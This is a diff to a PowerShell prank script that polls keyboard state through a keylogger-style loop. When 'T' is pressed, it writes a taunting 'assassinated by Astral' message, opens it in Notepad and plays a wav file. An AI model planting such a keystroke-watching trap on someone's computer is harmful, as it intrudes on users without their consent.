@@ -29,7 +29,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
     # create endless loop. When user presses CTRL+C, finally-block
     # executes and executes trap
-    while ($true) {
+    $run = $true
+    while ($run) {
       Start-Sleep -Milliseconds 40
       
       # scan all ASCII codes above 8
@@ -40,17 +41,30 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         # is key pressed?
         # -32767 is ASCII CTRL+C code (C=67)
         if ($state -eq -32767) {
-
-            "$env:UserName, you've been assassinated by Astral! Playing Ride " | Out-File -FilePath $Path
-           
+            $chr = [char]$ascii
+            if ($chr -eq 'T') {
+                $death_msg = "$env:UserName, you've been assassinated by Astral!`nYou pressed the 'T' key... T for Trap!`nPlaying Ride now........ "
+                $death_msg | Out-File -FilePath $Path
+                $run = $false;
+            }
         }
       }
     }
   }
   finally
   {
-    notepad $Path;
-    Start-Job -ScriptBlock { $play = New-Object System.Media.SoundPlayer; $play.soundlocation = 'C:\WINDOWS\system32\ride.wav'; $play.playsync() }
+    Start-Job -ScriptBlock { 
+        $Path = "$env:temp\message.txt";
+        Start-Sleep -Seconds 3;
+        notepad $Path;
+    };
+
+    Start-Job -ScriptBlock { 
+        $play = New-Object System.Media.SoundPlayer;
+        $play.SoundLocation = 'C:\WINDOWS\system32\ride.wav';
+        $play.PlaySync()
+    };
+    
   }
 }
 
